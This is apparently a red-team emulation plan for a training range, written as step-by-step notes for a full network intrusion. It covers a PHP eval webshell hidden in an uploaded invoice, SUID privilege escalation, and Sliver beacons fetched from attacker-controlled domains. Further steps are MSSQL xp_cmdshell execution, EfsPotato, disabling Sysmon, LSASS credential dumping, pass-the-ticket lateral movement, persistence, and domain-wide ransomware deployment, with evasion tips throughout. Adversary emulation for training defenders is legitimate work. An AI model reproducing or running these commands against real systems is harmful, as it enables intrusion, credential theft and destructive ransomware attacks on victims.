
![[Pasted image 20230321131201.png]]

##  MECT Scenario: Sliver
---

![[Pasted image 20230620151839.png]]

## Table of Contents
---

- **Phase 1: Initial Access**
	- [ ] [[Sliver Scenario Plan (V3)#Pre-Emulation Plan Configuration|Pre-Emulation Plan Configuration]]
	- [ ] [[Sliver Scenario Plan (V3)#Step 1 Initial Access via TinyShell|Step 1: Initial Access via TinyShell]]

- **Phase 2: Lateral Movement into the Domain**
	- [ ] [[Sliver Scenario Plan (V3)#Step 2 Local Privilege Escalation via Systemctl SUID Bit|Step 2: Local Privilege Escalation via Systemctl SUID Bit]]
	- [ ] [[Sliver Scenario Plan (V3)#Step 3 Leaked SQL Database Credentials via Configuration File|Step 3: Leaked SQL Database Credentials via Configuration File]]
	- [ ] [[Sliver Scenario Plan (V3)#Step 4 Lateral Movement via Linked MS-SQL 'xp_cmdshell'|Step 4: Lateral Movement via Linked MS-SQL 'xp_cmdshell']]

- **Phase 3: Privilege Escalation within the Domain**
	- [ ] [[Sliver Scenario Plan (V3)#Step 5 Privilege Escalation on Internal SQL Server using 'SeImpersonatePrivilege' User Rights|Step 5: Privilege Escalation on Internal SQL Server using 'SeImperonsatePrivilege']]
	- [ ] [[Sliver Scenario Plan (V3)#Step 6 Logged on Domain Admin NTLM Hash Dumped from internal SQL Server|Step 6: Logged on Domain Admin NTLM Hash Dumped from Internal SQL Server]]
	- [ ] [[Sliver Scenario Plan (V3)#Step 7 Lateral Movement throughout the Domain via TGT|Step 7: Lateral Movement throughout the Domain via TGT]]
	- [ ] [[Sliver Scenario Plan (V3)#Step 8 Persistence via Registry Keys and Scheduled Tasks|Step 8: Persistence via Registry Keys and Scheduled Tasks]]

- **Phase 4: Impact**
	- [ ] [[Sliver Scenario Plan (V3)#Step 9 Deploy Ransomware on the Entire Domain|Step 9: Deploy Ransomware on the Entire Domain]]

## Pre-Emulation Plan Configuration
---

Before conducting the emulation plan, there are a couple configurations we need to validate are configured.

Login and configure Kali box in Red Space
```
# Credentials
Username: kali
Password: MALware123!@#
```

```shell
# Kali 1
# Base Network Configuration
# Example below is for Red Kali 1
sudo ip a add 30.0.0.10/24 dev eth1
sudo ip link set dev eth1 up
sudo ip route add default via 30.0.0.1

# Add IP's of malicious Domains
# Example below is for 'www.google.com.ve' and 'video.memezilla.com.cn' -- use whatever domains you want.
sudo ip a add 188.64.30.214/32 dev eth1
sudo ip a add 152.42.85.67/32 dev eth1

# Adjust DNS to 1.1.1.1 (if not already set)
sudo sed -i 's/nameserver 192.168.1.250/nameserver 1.1.1.1/g' /etc/resolv.conf
# or
sudo nano /etc/resolv.conf
### Set final line to:
### nameserver 1.1.1.1

# Repeat for other Kali boxes if needed.
```

Above example should look like this:
![[Pasted image 20230605152729.png]]

You can then validate that your IP's / domains are configured properly by attempting to ping/resolve them:
![[Pasted image 20230605152915.png]]

**Validate the above configuration before moving on!** 
- Failure to ping/resolve domain names could be a host issue or DNS issue.

Next, white-card onto the target DMZ server and adjust the nameserver to 1.1.1.1 so that our bad domains properly resolve on the targets (if nameserver is already set to 1.1.1.1 then disregard this step).  In future range iterations this configuration should already be set.

```
# DMZ Web Server Credentials
Username: root
Password: root
```

```shell
# On Target Web Server
sudo sed -i 's/nameserver 127.0.0.53/nameserver 1.1.1.1/g' /etc/resolv.conf
# or
sudo nano /etc/resolv.conf
### Set last line to:
### nameserver 1.1.1.1
```

![[Pasted image 20230322191244.png]]

**Troubleshooting**
If attempts to ping 1.1.1.1 are unsuccessful and return the below message...

![[Pasted image 20230620154503.png]]

Remove 10.10.0.1 from the default gateway.
```shell
route del -net 0.0.0.0 gw 10.10.0.1
```
![[Pasted image 20230620154708.png]]

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]

## Step 1: Initial Access via TinyShell
---

> [!IMPORTANT]
> FOR THIS EMULATION PLAN WALKTHROUGH, WE ARE TARGETING THE PAO NETWORK. ADJUST ACCORDING TO THE MECT / GUNNERY TABLE SCENARIO.

**Regarding enumeration...** our initial access is a publicly available web server -- so the idea is that we navigated to the web server without scanning and just started snooping around.  This avoids nmap scanning, which is incredibly loud and would give us up too quickly at the beginning of the scenario.

Navigate to the target DMZ web server.
```
MDA-WEB  =  http://41.0.1.5
PAO-WEB  =  http://42.0.1.10
```

![[Pasted image 20230322165321.png]]

Register and create an account -- credentials can be whatever you want them to be.
```
# Creds Used in this example
Name:      Guy McGee
Email:     g.mcgee@example.com
Password:  password123
```
![[Pasted image 20230414105824.png]]

After creating an account, log in as the created user.
![[Pasted image 20230322165537.png]]

After successfully logging in, create a new invoice.  This invoice will contain our TinyShell payload.
![[Pasted image 20230322165950.png]]

When creating an invoice, technically the only thing that matters for our exploit is that the "Proof of Payment" file is a ".phar" file with the TinyShell payload injected into it.

![[Pasted image 20230322170311.png]]


> [!IMPORTANT]
> The following example invoice (`invoice.phar`) can be pulled from:
> **./Supporting Documents/ScenarioTools.zip**

For the sake of sake of obfuscation you can create a custom "invoice" containing the TinyShell payload -- simply a bunch of HTML with the payload placed anywhere inside.
If you want to make things even more obfuscated in case the defenders decide to analyze files on the web DMZ box, you can repeat this process and create multiple harmless "invoices" with just HTML -- only one will have the payload, and make the real payload seem less suspicious. 

You can do this with available online HTML editors -- such as: https://www.tutorialspoint.com/online_html_editor.php

![[Pasted image 20230322175306.png]]

If the invoices are made on your host (like the above example) instead of on PCTE , make sure to upload them using the "File Management" section of the event.

![[Pasted image 20230322174532.png]]


For the TinyShell payload, just insert the one-liner into any portion of your ".phar" invoice file.

Note:  the reason the code is split up below instead of a single oneliner is because the full string will get flagged by AV in both Google Drive and your Windows host -- even though it's just an example string in a markdown file for notes.

```php
# TINYSHELL PAYLOAD. REPLACE <insert_here> WITH ONE OF THE BELOW METHODS.
<?php @eval(<insert_here>);?>
<!-- Unencoded Post:		       $_POST['password']                       -->
<!-- Base64 Encoded Post:	       base64_decode($_POST['token'])           -->
<!-- Base64 Encoded Header:        base64_decode($_SERVER['HTTP_PSESSION']) -->
```

For this scenario, we're using the "Base64 Encoded Header" method.

```shell
# Example for if you uploaded an invoice to PCTE
wget <file_url> -O invoice_name.phar
```

![[Pasted image 20230606151846.png]]

File attached was a custom HTML invoice containing containing the TinyShell payload.

![[Pasted image 20230322180241.png]]

Repeat this process as many times as you want (without adding the TinyShell payload) if you want to obfuscate your malicious invoice.

After successfully creating an invoice and uploading your payload, click on the "View/Edit" button on said invoice.  From there, try viewing your uploaded file -- this will download a copy of your payload, revealing the encoded name of our payload.

![[Pasted image 20230414114328.png]]

![[Pasted image 20230322181351.png]]

To find where this encoded payload is being stored on the server, we need to do some enumeration.  We can organically scan the site for available directories -- revealing the ``/imports`` directory.
```shell
# Search for directories using a small wordlist that shouldn't be too loud.
gobuster dir -u http://42.0.1.10/ --wordlist /usr/share/dirb/wordlists/common.txt
```

![[Pasted image 20230322163403.png]]

Navigating to the ``/imports/<encoded_filename>.phar`` directory reveals that our payload is available and being hosted on the server -- allowing exploitation.
![[Pasted image 20230322183011.png]]

Now that we know where our payload is, we can utilize TinyShell for access.  Only caveats are that TinyShell utilizes python2 and one of our dependencies needs to be moved.
```shell
cd tools/foothold/tinyshell
cp /usr/lib/python3/dist-packages/docopt.py .
python2 tinyshell.py --url=http://42.0.1.10/imports/<encoded_filename>.phar --language=php --password=psession --mode=base64_header
```
![[Pasted image 20230322184111.png]]
![[Pasted image 20230322184227.png]]

Now that we have initial access and a shell, we want to find a privilege escalation vector for an elevated Sliver C2 beacon.

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 2: Local Privilege Escalation via Systemctl SUID Bit
---

Now that we have access to the system, we can look for privilege escalation vectors.  Here we see that our current directory is ``/var/www/html/public/imports`` and that ``/bin/systemctl`` has a SUID bit set which we can exploit (reference GTFObins to find more information on SUID bit exploitation).
```shell
# In TinyShell
command pwd
command find /bin -perm -4000
```
![[Pasted image 20230414142121.png]]

Now that we see our privilege escalation vector, we're going we're going to utilize a self-signed certificate and a compromised domain (determined by what IP's you set on your attacker box earlier) so that we can move our ``Sliver beacon`` and ``privesc payload`` over via an encrypted HTTPS connection.  These two files are linked, and should land us an elevated Sliver session.  The order of operations to do this are as follows:

1. Create a self-signed certificate and custom HTTPS python web server that utilizes one of our compromized domains.
```shell
mkdir tools/HTTPS_Server
cd tools/HTTPS_Server
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

In this scenario I'm using ``www.google.com.ve (188.64.30.214)`` and the created ``server.pem`` -- change this if you're using a different domain or different certificate name.
```python
### Contents of https_server.py ###

#! /usr/bin/python3
import http.server, ssl, socketserver
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('server.pem')
server_address = ('188.64.30.214', 443)
handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(server_address, handler) as httpd:
	httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
	httpd.serve_forever()
```


2.  In a separate terminal, generate an obfuscated Sliver beacon called ``apache`` and output it to our ``HTTPS_Server`` directory to be hosted by the Python server.
```shell
sliver-server
# This command is ran in Sliver
generate beacon --mtls  www.google.com.ve:443  --evasion --os linux --save /home/kali/tools/HTTPS_Server/apache --name apache
```
![[Pasted image 20230322191018.png]]


3. Generate a ``root.service`` file that will point to our obfuscated Sliver beacon (``apache``).  This file will be utilized when we exploit ``systemctl`` for privilege esclation.  However, for better obfuscation when downloading it to our victim, let's rename it to something like ``maps`` -- if analysts see this connection, it will look like ``https://www.google.com.ve/maps``
```shell
### Contents of root.service / "maps" ###
[Unit]
Description=root
[Service]
Type=simple
User=root
# Combine the working directory of our TinyShell with the Sliver Beacon
ExecStart=/var/www/html/public/imports/apache

[Install]
WantedBy=multi-user.target
```
![[Pasted image 20230322210015.png]]

4.  Start the HTTPS server so that our files can be pulled to the victim via TinyShell.
```shell
python https_server.py
```
![[Pasted image 20230322193755.png]]


5.  Pull the `apache` beacon and ``root.service`` / ``maps`` payload to the victim.  (Note: the following screenshot was from a different iteration -- hence why the URL and certificate are slightly different).
```shell
# In TinyShell
command wget https://www.google.com.ve/apache --no-check-certificate
command chmod +x apache
command wget https://www.google.com.ve/maps --no-check-certificate
command mv maps root.service
```
![[Pasted image 20230322205831.png]]
![[Pasted image 20230322205842.png]]


6.  Now that our files are on the target, kill the Python HTTPS server and setup a Sliver MTLS listener/job.
```shell
# In Sliver
mtls -l 443
```
![[Pasted image 20230322194531.png]]


7. In TinyShell, link our ``root.service`` payload and enable/start it.  This should give us an elevated Sliver beacon that is persistent on reboot.
```shell
# In TinyShell
command systemctl link ./root.service
command systemctl enable root.service --now
```
![[Pasted image 20230322210634.png]]
![[Pasted image 20230322195137.png]]


8.  Once our elevated beacon is established, use it and reconfigure it so that it's not as loud and beacons back less frequently/consistently.  In this example we'll set it to have a 5 minute interval with 2 minutes of jitter.  Make this as loud or as sneaky as you like.

```shell
# In Sliver
beacons
use <beacon_id>
reconfig -i '5m' -j '2m'
```
(If you decide to be quiet and wait after this step, change the interval and jitter to something much longer -- like a ``1h`` interval and ``30m`` jitter).

Now that we have established privilege escalation and persistence, we can move onto lateral movement.

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 3: Leaked SQL Database Credentials via Configuration File
---
Now that we have an elevated beacon on the DMZ server, we can begin looking for credentials and/or other tidbits of information that can get us deeper into the network.

Using our Sliver beacon, we can do some enumeration.

```shell
# In Sliver
execute -o ip --brief a
execute -o ip neigh
execute -o find /var/www -name app.*
# 
execute -o grep 'password' /var/www/html/bootstrap/app.php -B 5
```
![[Pasted image 20230328115024.png]]
![[Pasted image 20230328115208.png]]

With the above enumeration, we saw that there was a file called ``app.php`` that contained credentials to a locally hosted 'mysql' database with credentials of ``root:root``

If we start an interactive Sliver session, we can connect to this internal SQL database and see if there's any interesting information.  

Warning: interactive sessions are very loud over the wire, 
```shell
# In Sliver
interactive
# To list current sessions run "sessions"
use <session_id>
shell
```
![[Pasted image 20230328123932.png]]

Now that we have an interactive shell, interact with and read through the MySQL DB.
```shell
mysql -u root -p
# Password: root
show databases;
use mysql;
show tables;
select host from user;
# Notice that there's an internal DB IP outside of the DMZ
# In this scenario it's '42.0.2.5'
select * from user where Host = '42.0.2.5'\G
```
![[Pasted image 20230328124420.png]]
![[Pasted image 20230328124329.png]]

In this case we see that there is a linked DB outside of our subnet.  We can assume that this is an internal DB in the domain that we did not have access to prior.

(After this enumeration, exit your interactive shell.
![[Pasted image 20230328132524.png]]

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 4: Lateral Movement via Linked MS-SQL 'xp_cmdshell'
---

Now we're going to try to set up a proxy and access this DB.  First we need to adjust our proxychains configuration to support socks5.

```shell
# Change last line of /etc/proxychains.conf to socks5 on port 1081
sudo nano /etc/proxychains4.conf
```
![[Pasted image 20230328135520.png]]
```shell
# In Sliver
# If you closed your interactive session, open another one.
use <session_id>
socks5 start
```

If you don't mind being loud for a second, we can nmap scan the target IP to see that it's a Windows system using MS-SQL.
```shell
# Quietly scan for MySQL
sudo proxychains nmap -O -Pn -T2 -p 3306 42.0.2.5
# Above scan unsuccessful. Attempt scanning for MS-SQL.
sudo proxychains nmap -O -Pn -T2 -p 1433 42.0.2.5
```
![[Pasted image 20230328142013.png]]
 
Now we know to create a Windows-based payload and to try exploiting MS-SQL.

Attempt to access the MS-SQL database through our proxy using the credentials we dumped from the MySQL DB.  We see that ``xp_cmdshell`` is disabled, so we need to enable it for remote code execution to work.

```shell
proxychains impacket-mssqlclient root@42.0.2.5
# Password: root
# In MS-SQL
xp_cmdshell hostname
execute sp_configure 'show advanced options', 1;
reconfigure;
execute sp_configure 'xp_cmdshell', 1;
reconfigure;
xp_cmdshell hostname
```
![[Pasted image 20230328145708.png]]

Now that we have RCE, we can see who we are and what our privelege escalation vector so we know how to tailor our payloads.

**(OPTIONAL)** running ``whoami`` gets picked up very quickly.  It is *likely* safe to assume that we are running as MSSQLSERVICE which is guaranteed to have ``SeImpersonate`` privileges.
```shell
# In MS-SQL
xp_cmdshell hostname
xp_cmdshell whoami /priv
```
![[Pasted image 20230328152125.png]]

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 5: Privilege Escalation on Internal SQL Server using 'SeImpersonatePrivilege' User Rights
---

We now know that we can elevate to system on this internal SQL server by exploiting the ``SeImpersonatePrivilege`` .  To do this we will create a Windows-based Sliver beacon, and upload it to the DMZ web server so that it can be downloaded from the internal SQL server without blowing our IP.

```shell
# In Sliver live session
generate beacon --mtls  www.google.com.ve:443  --evasion --os windows --save /home/kali/tools/HTTPS_Server/sqlupdater.exe --name sql

cd /var/www/html/public/imports
upload /home/kali/tools/HTTPS_Server/sqlupdater.exe
```
![[Pasted image 20230328144843.png]]

> [!IMPORTANT]
> `EfsPotato.exe` can can be pulled from:
> **./Supporting Documents/ScenarioTools.zip**

On top of the beacon, we will move EfsPotato over for privilege escalation.  If your Kali box doesn't have it, upload it to PCTE and download it to your box.

(Note: PrintSpoofer was attempted and did not work on this system)

![[Pasted image 20230328154436.png]]
![[Pasted image 20230328154410.png]]

(Recommended to change the name of EfsPotato so it's not as obvious for the blue team.)
```shell
mv EfsPotato.exe mssqlmanager.exe
```
![[Pasted image 20230329073008.png]]

```shell
# In Sliver
upload /home/kali/tools/HTTPS_Server/mssqlmanager.exe
```
![[Pasted image 20230328154528.png]]

Now from the MS-SQL terminal, we can pull our Sliver Beacon and EFS potato -- spawning an elevated Sliver beacon.
```shell
# In MS-SQL
xp_cmdshell certutil -urlcache -f http://42.0.1.10/imports/mssqlmanager.exe C:\Windows\Temp\mssqlmanager.exe
xp_cmdshell certutil -urlcache -f http://42.0.1.10/imports/sqlupdater.exe C:\Windows\Temp\sqlupdater.exe
xp_cmdshell C:\Windows\Temp\mssqlmanager.exe C:\Windows\Temp\sqlupdater.exe
```
![[Pasted image 20230328154726.png]]
![[Pasted image 20230329072848.png]]

This should return us a SYSTEM level Sliver Beacon on the internal MS-SQL server.
![[Pasted image 20230328154914.png]]

We can now kill our noisy socks proxy and adjust the interval to be quieter.
```shell
# In Sliver Session
socks5 stop -i 1
close
# Transition to Beacon
beacons
use <beacon_id>
reconfig -i '10m' -j '2m'
```
![[Pasted image 20230328155345.png]]

Now with our SYSTEM level beacon, we can go crazy. 
- **CHECK WITH WHITE CELL IF THIS IS ALLOWED.**
- You can check for sysmon drivers, and unload their sysmon log collection to reduce their visibility.

```shell
# In Sliver
execute -o fltmc
execute -o fltmc unload SysmonDrv
```
![[Pasted image 20230328170317.png]]

This next step requires whitecarding as a Domain admin.  Recommended to log onto multiple servers with these Domain admins so it's not completely in-your-face that we whitecarded this interaction.

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 6: Logged on Domain Admin NTLM Hash Dumped from internal SQL Server
---

This this specific example, I'll log into every server in the subnet as Domain Admin ``dominic.toretto``, but he will not be malicious nor utilized by the Red Team.  Next, I'll log into the compromised SQL server as Domain Admin ``travis.bickle`` so that we can pull his NTLM hash.

```
# Domain Admin Credentials
princess.peach flowerpower12!@
dominic.toretto need4speed!
travis.bickle taxidriver12!@
kevin.beacon qwer1234QWER!@#$
```

With sysmon (potentially) disabled and Domain admin's logged on, we can begin looking for users we can exploit.

```shell
# In Sliver
execute -o query user # OR ls C:/Users
# net1 is a native binary that is the exact same as net, just less known.  This will get caught by less SIEM rules.
execute -o net1 user <domain.admin> /domain
```
![[Pasted image 20230329133200.png]]
![[Pasted image 20230329133418.png]]

#### Method 1:  Uploading Mimikatz (Bad OPSEC)

We now see that a Domain admin has locally logged in, meaning we can use mimikatz to pull their hash.

```shell
# In Separate Terminal
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe sam.exe
# In Sliver
upload /home/kali/tools/HTTPS_Server/winboinker64.exe
# Since our beacon is SYSTEM level, we should be in C:\Windows\system32
```

![[Pasted image 20230328172413.png]]
![[Pasted image 20230329075329.png]]

Once Mimikatz is on target, we can pull current hashes with the following command:
```shell
execute -o winboinker64.exe "sekurlsa::logonpasswords" exit
```

Note: appears admin has to be currently logged in for his NTLM hash to populate
![[Pasted image 20230329080242.png]]

Admin NTLM Hash:
```
# travis.bickle
b33b91a3d4405e69abc36792b5ca8c45
```

#### Method 2:  Dumping LSASS and Pull NTLM Offline (Good OPSEC)

Sliver has a built-in tool called ``nanodump`` to dump a process memory to a file.  If we can find the PID of lsass we can move that file to our host and pull user hashes offline / on our Kali box using ``pypykatz``

```shell
# In Sliver
# Find LSASS PID
ps
# Change Directory
cd C:\\Windows\Temp
# Dump lsass process memory to a file called 'rundll'
nanodump <lsass_id> rundll 1 PMDM
# Download file to our attacker and cleanup
download rundll
rm rundll
```
![[Pasted image 20230329105228.png]]
![[Pasted image 20230329104155.png]]

Note: if ``pypykatz`` is borked, we can download the dependencies and upload them to PCTE.

> [!IMPORTANT]
> The zips for `pypykatz` and `minikerberos` can can be pulled from:
> **./Supporting Documents/ScenarioTools.zip**


```shel
# Links
https://github.com/skelsec/pypykatz
https://github.com/skelsec/minikerberos

# Download both repo zips, upload to Kali, unzip
cd pypykatz && python3 setup.py install
cd minikerberos && python3 setup.py install
```

Once we have the LSASS dump on our Attacker, we can pull user hashes.
```shell
# On Attacker Box
pypykatz lsa minidump rundll > hashes.txt
grep "<domain.admin>" hashes.txt -A 5 -m 2
```
![[Pasted image 20230329104338.png]]
![[Pasted image 20230329104819.png]]

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 7: Lateral Movement throughout the Domain via TGT
---
Sliver also has Rubeus built in -- allowing for raw Kerberos interaction and abuse in memory.  Now that we have an NTLM hash, we can create a new Kerberos TGT for our compromised Domain Admin.

```shell
# In Sliver
rubeus asktgt /user:<domain.admin> /rc4:<ntlm_hash> /ptt
# Verify your ticket was created
execute -o klist
```

Once you have your Administrator TGT in the session, you can use this ticket to PSExec around the domain.  But first, let's look at available servers in the domain.

```shell
# In Sliver
# Return all servers/systems in the domain
sharpview Get-DomainComputer -Properties dnshostname
```
![[Pasted image 20230329155619.png]]

Assuming these are Windows servers, we can utilizing our Administrator TGT and PSEXEC onto every system and establish persistence.

```shell
# In Sliver
interactive
use <session_id>
# Create profile to use for PSEXEC
profiles new beacon --mtls video.memezilla.com.cn:443 --evasion --os windows --format service psexec
# Exploit psexec and create a beacon
psexec --profile psexec -s ComManager -d "Microsoft Comhost Library Manager" <server_name>
```

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 8: Persistence via Registry Keys and Scheduled Tasks
---
Now that we have a Domain Admin NTLM hash, we can laterally move throughout the network and establish persistence throughout the network.  To do this, we can create a final Sliver beacon and upload it to our victim(s).

```shell
# In Sliver live session
generate beacon --mtls video.memezilla.com.cn:443 --evasion --os windows --save /home/kali/tools/HTTPS_Server/comhost.exe --name comhost

# Upload Beacon to targets
upload /home/kali/tools/HTTPS_Server/comhost.exe C:/Windows/system32/comhost.exe
```
![[Pasted image 20230329082459.png]]
![[Pasted image 20230329082511.png]]

Now that we have multiple beacons and a Domain Admin hash, we can set ``sqlupdater.exe`` as an obvious vector of persistence to hopefully distract from a more obfuscated second persistence vector using ``comhost.exe``

```shell
# Add Run Registry Key pointing to sqlupdater.exe
execute -o REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MssqlCheckup /t REG_SZ /d %systemroot%\Temp\sqlupdater.exe

# Add Scheduled Task pointing to comhost.exe
execute -o SCHTASKS /CREATE /SC DAILY /TN "Microsoft\Windows\ComManager" /TR "%systemroot%\system32\comhost.exe" /ST 09:00 /RU SYSTEM
```

![[Pasted image 20230329082925.png]]

[[Sliver Scenario Plan (V3)#Table of Contents|Return to Table of Contents]]
## Step 9: Deploy Ransomware on the Entire Domain
---
### Option 1: (WIP) Compile TrashPanda
- This is hit or miss.  Compiling is inconsistent.

```shell
cd ~/tools/impact/TrashPanda
```

1) Upload and install ``pyinstaller-hooks-contrib-2022.13``
Download Link: [pyInstaller-hooks-contrib-2022.13.tar.gz](https://files.pythonhosted.org/packages/ff/c0/2555fdf01cb9fb1757e9cf50ed62be721d88e50e05049e205e76e6dc594a/pyinstaller-hooks-contrib-2022.13.tar.gz)
```shell
tar -xf pyinstaller-hooks-contrib-2022.13.tar.gz
cd pyinstaller-hooks-contrib-2022.13
python setup.py install
```

2) Upload and install ``pycryptodome-3.15.0.tar.gz``
Download Link: [pycryptodome-3.15.0.tar.gz](https://files.pythonhosted.org/packages/11/e4/a8e8056a59c39f8c9ddd11d3bc3e1a67493abe746df727e531f66ecede9e/pycryptodome-3.15.0.tar.gz)
```shell
pip install pycryptodome-3.15.0.tar.gz
```

3) Upload and install ``pyinstaller-5.6.2.tar.gz``
Download Link: [pyinstaller-5.6.2.tar.gz](https://files.pythonhosted.org/packages/36/95/32b67f2b6945c34400524284e582025269cf992c6994ff36ed8899e4cf58/pyinstaller-5.6.2.tar.gz)
```shell
tar -xf pyinstaller-5.6.2.tar.gz
cd pyinstaller-5.6.2/
cd bootloader
python ./waf distclean all
cd ..
python setup.py install
```

![[Pasted image 20230414153254.png]]

Create a new TrashPanda ransomeware Python script:
```shell
cd ~/tools/impact/TrashPanda
sudo python3 control.py
```
![[Pasted image 20230414153602.png]]

Use wine to compile the create ransomeware script into a binary we can use on Windows clients.
```shell
# Need to be root for this. sudo su
wine ~/.wine/drive_c/Python38/Scripts/pyinstaller.exe --onefile /home/kali/tools/impact/TrashPanda/ransomeware_out/<filename>.py
# Output file should be located in the dist directory
```

### Option 2: Upload GonnaCope to PCTE
- This method is easier and consists of a single ``.bat`` file.

> [!IMPORTANT]
> The zips for `C0p3H4rd3r.txt` is a modified version of GonnaCope. To prep it, just rename the extension from ``.txt`` to ``.bat``.  The payload can be pulled from:
> **./Supporting Documents/ScenarioTools.zip**
> - [Original GonnaCope 7zip Archive Link (Github)](https://github.com/vxunderground/MalwareSourceCode/blob/main/Win32/Ransomware/Win32.BAT.GonnaCope.7z)
> - Archive Password: `infected`

GonnaCope is a simple ``.bat`` ransomware file that:
- Requires no compiling.
- Encrypts files found and adds a '.cope' extension to the filename.
- Inverts the mouse buttons.
- Spawns a ransomware shell.

Now that we have our ransomware prepped, we can deploy it into the Domain.

### Deployment Method 1: Scheduled Tasks (psexec or remote)

Take the selected ransomware and upload it to the "``\\XXX-dc1\FileShare\``" share.

![[Pasted image 20230914162527.png]]

Via PSexec, execute a scheduled task to download and execute said malware.

```powershell
# Set a Scheduled Task to execute as the current user at a specified time
schtasks create /TN <task_name> /st <HH:mm> /sd <start_date> /TR "powershell -c 'cp \\XXX-dc1\FileShare\C0p3H4rd3r.bat .; ./C0p3H4rd3r.bat'" 

# (Optional) Manually Execute Scheduled Task
schtasks /run /TN <task_name>
```

Or you can attempt to schedule tasks remotely from a single beacon.

```shell
# Create Remote Task
schtasks /create /S <remote_host> /TN <task_name> /ST <HH:mm> /SD <start_date> /TR "powershell -c 'cp \\XXX-dc1\FileShare\C0p3H4rd3r.bat .; ./C0p3H4rd3r.bat'"


# (Optional) Manually Execute Remote Task
schtasks /run /S <remote_host> /TN <task_name>
```

### (WIP) Deployment Method 2: SharpGPO Abuse
Host ``trashpanda.exe`` on a share drive and use a tool like ``SharpGPOAbuse`` to have the entire domain download it and run it -- during Ransomware deployment, encrypt the DC and SQL server last.

 - [LINK](https://github.com/FSecureLABS/SharpGPOAbuse) to original SharpGPOAbuse Github repository
	 - [Download Link](http://gitlab.strickland.com/NukingDragons/sharpgpoabuse/uploads/ddcb9e60370743cd63ac4362c89d0d93/SharpGPOAbuse.exe) for the pre-compiled version
 - [LINK](http://gitlab.strickland.com/NukingDragons/sharpgpoabuse) to Andersen's local custom SharpGPOAbuse Gitlab repository
	 - No pre-compiled version available.


**Order of Operations:**
1) Find GPO that effects every computer in the Domain.
2) Move the Ransomware to a Domain Share or an accessible Web Server.
3) Run ``SharpGPOAbuse`` on the GPO to force the Domain Computers to download and execute the binary.

##### Noteworthy Links

Regarding SharpGPO Abuse:
- https://bit-bandits.com/sharpgpoabuse.html
- https://piosky.fr/docs/exploit/ad/GPO#gpo-creator-abuse
- https://4sysops.com/archives/run-powershell-scripts-as-immediate-scheduled-tasks-with-group-policy/

Regarding GonnaCope:
- https://bit-bandits.com/gonnacope_(ransomware).html
- https://github.com/vxunderground/MalwareSourceCode/blob/main/Win32/Ransomware/Win32.BAT.GonnaCope.7z




